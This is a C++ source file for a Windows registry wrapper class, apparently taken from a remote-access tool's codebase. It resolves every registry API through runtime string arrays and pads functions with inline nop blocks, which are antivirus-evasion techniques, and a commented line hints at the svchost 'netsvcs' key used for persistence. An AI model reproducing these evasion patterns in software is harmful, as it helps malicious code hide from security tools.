// Registry.cpp : implementation file
//

#include "../Declare.h"   //动态调用库函数
#include "Registry.h"
#include "RegeditOpt.h"

/////////////////////////////////////////////////////////////////////////////
// CRegistry

CRegistry::CRegistry(HKEY hKey)
{
	m_hKey=hKey;
}
CRegistry::CRegistry(char b)
{
   switch(b){
	   case MHKEY_CLASSES_ROOT:
                m_hKey=HKEY_CLASSES_ROOT;
		   break;
	   case MHKEY_CURRENT_USER:
            m_hKey=HKEY_CURRENT_USER;
		   break;
	   case MHKEY_LOCAL_MACHINE:
		   m_hKey=HKEY_LOCAL_MACHINE;
		   break;
	   case MHKEY_USERS:
		   m_hKey=HKEY_USERS;
		   break;
	   case MHKEY_CURRENT_CONFIG:
		   m_hKey=HKEY_CURRENT_CONFIG;
		   break;
	   default:
            m_hKey=HKEY_LOCAL_MACHINE;
		break;
	}
}
CRegistry::~CRegistry()
{
	Close();
}

/////////////////////////////////////////////////////////////////////////////
// CRegistry Functions

BOOL CRegistry::CreateKey(LPCTSTR lpSubKey)
{
	HKEY hKey;
	DWORD dw;
	char HrFvD16[] = {'R','e','g','C','r','e','a','t','e','K','e','y','E','x','A','\0'};
	RegCreateKeyExAT pRegCreateKeyExA=(RegCreateKeyExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD16);
	long lReturn=pRegCreateKeyExA(m_hKey,lpSubKey,0L,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,&dw);
    __asm
	{
		nop
			nop
			nop
			nop
			nop
			nop
}
	if(lReturn==ERROR_SUCCESS)
	{
		m_hKey=hKey;
		return TRUE;
	}
	
	return FALSE;
	
}

BOOL CRegistry::Open(LPCTSTR lpSubKey)
{
   
	HKEY hKey;
	char Sfxiw05[] = {'R','e','g','O','p','e','n','K','e','y','E','x','A','\0'};
	RegOpenKeyExAT pRegOpenKeyExA=(RegOpenKeyExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),Sfxiw05);
	long lReturn=pRegOpenKeyExA(m_hKey,lpSubKey,0L,KEY_ALL_ACCESS,&hKey);
    __asm
	{
		nop
			nop
			nop
			nop
			nop
			nop
}
	if(lReturn==ERROR_SUCCESS)
	{
        m_hKey=hKey;
		return TRUE;
	}
	return FALSE;
	
}

void CRegistry::Close()
{
	char Sfxiw07[] = {'R','e','g','C','l','o','s','e','K','e','y','\0'};
	char Sfxiw08[] = {'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	RegCloseKeyT pRegCloseKey=(RegCloseKeyT)GetProcAddress(LoadLibrary(Sfxiw08),Sfxiw07);
	if(m_hKey)
	{
		pRegCloseKey(m_hKey);
		m_hKey=NULL;
	}
	
}

BOOL CRegistry::DeleteValue(LPCTSTR lpValueName)
{
	char VnUDS03[] = {'R','e','g','D','e','l','e','t','e','V','a','l','u','e','A','\0'};
	RegDeleteValueAT pRegDeleteValueA=(RegDeleteValueAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),VnUDS03);
	long lReturn=pRegDeleteValueA(m_hKey,lpValueName);
	__asm
	{
		nop
			nop
			nop
			nop
			nop
			nop
}
	if(lReturn==ERROR_SUCCESS)
		return TRUE;
	return FALSE;
	
}

BOOL CRegistry::DeleteKey(HKEY hKey, LPCTSTR lpSubKey)
{
	char VnUDS02[] = {'R','e','g','D','e','l','e','t','e','K','e','y','A','\0'};
	RegDeleteKeyAT pRegDeleteKeyA=(RegDeleteKeyAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),VnUDS02);
	long lReturn=pRegDeleteKeyA(hKey,lpSubKey);
	__asm
	{
		nop
			nop
			nop
			nop
			nop
			nop
}
	if(lReturn==ERROR_SUCCESS)
		return TRUE;
	return FALSE;
	
}

bool CRegistry::DeleteKey(char *path)
{
	char VnUDS02[] = {'R','e','g','D','e','l','e','t','e','K','e','y','A','\0'};
	RegDeleteKeyAT pRegDeleteKeyA=(RegDeleteKeyAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),VnUDS02);
    long lReturn=pRegDeleteKeyA(m_hKey,path);
	__asm
	{
		nop
			nop
			nop
			nop
			nop
			nop
}
	if(lReturn==ERROR_SUCCESS)
		return TRUE;
	return FALSE;
}


BOOL CRegistry::Write(LPCTSTR lpSubKey, int nVal)
{

	DWORD dwValue;
	dwValue=(DWORD)nVal;
	char HrFvD12[] = {'R','e','g','S','e','t','V','a','l','u','e','E','x','A','\0'};
	RegSetValueExAT pRegSetValueExA=(RegSetValueExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD12);
	long lReturn=pRegSetValueExA(m_hKey,lpSubKey,0L,REG_DWORD,(const BYTE *) &dwValue,sizeof(DWORD));
	__asm
	{
		nop
			nop
			nop
			nop
			nop
			nop
}
   	if(lReturn==ERROR_SUCCESS)
		return TRUE;
	
	return FALSE;
	
}

BOOL CRegistry::Write(LPCTSTR lpSubKey, DWORD dwVal)
{
	char HrFvD12[] = {'R','e','g','S','e','t','V','a','l','u','e','E','x','A','\0'};
	RegSetValueExAT pRegSetValueExA=(RegSetValueExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD12);
	long lReturn=pRegSetValueExA(m_hKey,lpSubKey,0L,REG_DWORD,(const BYTE *) &dwVal,sizeof(DWORD));
	__asm
	{
		nop
			nop
			nop
			nop
			nop
			nop
}
   	if(lReturn==ERROR_SUCCESS)
		return TRUE;
	
	return FALSE;
	
}

BOOL CRegistry::Write(LPCTSTR lpValueName, LPCTSTR lpValue)
{
	char HrFvD12[] = {'R','e','g','S','e','t','V','a','l','u','e','E','x','A','\0'};
	RegSetValueExAT pRegSetValueExA=(RegSetValueExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD12);
	long lReturn=pRegSetValueExA(m_hKey,lpValueName,0L,REG_SZ,(const BYTE *) lpValue,strlen(lpValue)+1);
	__asm
	{
		nop
			nop
			nop
			nop
			nop
			nop
}
   	if(lReturn==ERROR_SUCCESS)
		return TRUE;
	
	return FALSE;
	
}


BOOL CRegistry::Read(LPCTSTR lpValueName, int* pnVal)
{
	
	DWORD dwType;
	DWORD dwSize=sizeof(DWORD);
	DWORD dwDest;
	char HrFvD13[] = {'R','e','g','Q','u','e','r','y','V','a','l','u','e','E','x','A','\0'};
	RegQueryValueExAT pRegQueryValueExA=(RegQueryValueExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),"RegQueryValueExA");
	long lReturn=pRegQueryValueExA(m_hKey,lpValueName,NULL,&dwType,(BYTE *)&dwDest,&dwSize);
	__asm
	{
		nop
			nop
			nop
			nop
			nop
			nop
}
	if(lReturn==ERROR_SUCCESS)
	{
		*pnVal=(int)dwDest;
		return TRUE;
	}
	return FALSE;
	
}

BOOL CRegistry::Read(LPCTSTR lpValueName, DWORD* pdwVal)
{
	
	DWORD dwType;
	DWORD dwSize=sizeof(DWORD);
	DWORD dwDest;
	char HrFvD13[] = {'R','e','g','Q','u','e','r','y','V','a','l','u','e','E','x','A','\0'};
	RegQueryValueExAT pRegQueryValueExA=(RegQueryValueExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),"RegQueryValueExA");
	long lReturn=pRegQueryValueExA(m_hKey,lpValueName,NULL,&dwType,(BYTE *)&dwDest,&dwSize);
	__asm
	{
		nop
			nop
			nop
			nop
			nop
			nop
}
	if(lReturn==ERROR_SUCCESS)
	{
		*pdwVal=dwDest;
		return TRUE;
	}
	return FALSE;
	
}
/*
BOOL CRegistry::RestoreKey(LPCTSTR lpFileName)
{
	
	long lReturn=RegRestoreKey(m_hKey,lpFileName,REG_WHOLE_HIVE_VOLATILE);
	__asm
	{
		nop
			nop
			nop
			nop
			nop
			nop
}
	if(lReturn==ERROR_SUCCESS)
		return TRUE;
	
	return FALSE;
}
*/
/*
BOOL CRegistry::SaveKey(LPCTSTR lpFileName)
{
	long lReturn=RegSaveKey(m_hKey,lpFileName,NULL);
	
	if(lReturn==ERROR_SUCCESS)
		return TRUE;
	
	return FALSE;
}
*/

BOOL CRegistry::Read(LPCTSTR lpValueName, BYTE* lpVal)
{

	DWORD dwType;
	DWORD dwSize=260;
	//char  buf[2550];
	//memset(buf,0,2550);
	//long lReturn=RegQueryValueEx(m_hKey,lpValueName,NULL,&dwType,(BYTE *)szString,&dwSize);
	//long lReturn=RegQueryValueEx(m_hKey, lpValueName, 0, &dwType, (BYTE *)szString, &dwSize);
	char HrFvD13[] = {'R','e','g','Q','u','e','r','y','V','a','l','u','e','E','x','A','\0'};
	RegQueryValueExAT pRegQueryValueExA=(RegQueryValueExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),"RegQueryValueExA");
	long lReturn=pRegQueryValueExA(m_hKey, lpValueName, 0, &dwType, (BYTE*)lpVal, &dwSize);
	__asm
	{
		nop
			nop
			nop
			nop
			nop
			nop
}
	//DWORD type,size;
	//long lReturn=RegQueryValueEx(m_hKey, "netsvcs", 0, &type, (buf), &size);
	if(lReturn==ERROR_SUCCESS)
	{
		//*lpVal=buf;
		return TRUE;
	}
	return FALSE;
	
}

HKEY CRegistry::GetKey()
{
  return m_hKey;
}

BOOL CRegistry::ReadBuf(LPCTSTR lpValueName, char *lpVal,DWORD &size)
{ 	
    DWORD type;
	__asm
	{
		nop
			nop
			nop
			nop
			nop
			nop
}
	char HrFvD13[] = {'R','e','g','Q','u','e','r','y','V','a','l','u','e','E','x','A','\0'};
	RegQueryValueExAT pRegQueryValueExA=(RegQueryValueExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),"RegQueryValueExA");
	long lReturn=pRegQueryValueExA(m_hKey, lpValueName, 0, &type, (BYTE*)lpVal, &size);
	if(lReturn==ERROR_SUCCESS)
	{
		return size;
	}
	return FALSE;
   return false;
}

BOOL CRegistry::WriteBuf(LPCTSTR lpValueName, LPCTSTR lpValue) 
{__asm
{
	nop
		nop
		nop
		nop
		nop
		nop
}
	char HrFvD12[] = {'R','e','g','S','e','t','V','a','l','u','e','E','x','A','\0'};
	RegSetValueExAT pRegSetValueExA=(RegSetValueExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD12);
	long lReturn=pRegSetValueExA(m_hKey,lpValueName,0L, REG_EXPAND_SZ,(const BYTE *) lpValue,strlen(lpValue)+1);
	
   	if(lReturn==ERROR_SUCCESS)
		return TRUE;
	
	return FALSE;
}

